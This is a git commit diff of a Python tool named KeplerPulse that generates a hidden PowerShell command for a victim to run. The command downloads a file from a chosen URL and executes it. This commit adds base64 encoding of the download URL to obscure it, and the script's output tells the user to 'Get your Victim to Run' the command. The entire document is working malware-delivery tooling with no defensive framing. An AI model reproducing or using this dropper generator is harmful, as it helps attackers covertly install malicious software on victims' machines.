e349b0e6543e13206cb3e588bd88faa1c8216cd3
quantumcore <fastcorp11@gmail.com>
2020-01-28 19:08:20 +0500

    Base64 added

--- keplerpulse.py
+++ keplerpulse.py
@@ -4,6 +4,7 @@ from colorama import Fore, Style
 import colorama
 import time
 import os, argparse
+import base64
 
 banner = """
 ██╗  ██╗███████╗██████╗ ██╗     ███████╗██████╗     ██████╗ ██╗   ██╗██╗     ███████╗███████╗
@@ -16,7 +17,7 @@ banner = """
 """
 def __main__():
     powershell_ = r"""
-    powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{source}','{dest}'); Start-Process "{dest}"
+    powershell.exe -windowstyle hidden $a = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{source}')); (new-object System.Net.WebClient).DownloadFile($a,'{dest}'); Start-Process "{dest}"
     """
     
     parser = argparse.ArgumentParser(description="KeplerPulse")
@@ -29,7 +30,8 @@ def __main__():
     dest = arguments.t
     stamp = str(time.strftime("%m/%d/%m"))
     print(Style.BRIGHT + Fore.LIGHTRED_EX + banner + Style.RESET_ALL)
-    old = powershell_.replace("{source}", payload)
+    encoded = base64.b64encode(payload.encode())
+    old = powershell_.replace("{source}", encoded.decode())
     new = old.replace("{dest}", dest)
    
     print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Get your Victim to Run the following "+ Style.RESET_ALL)
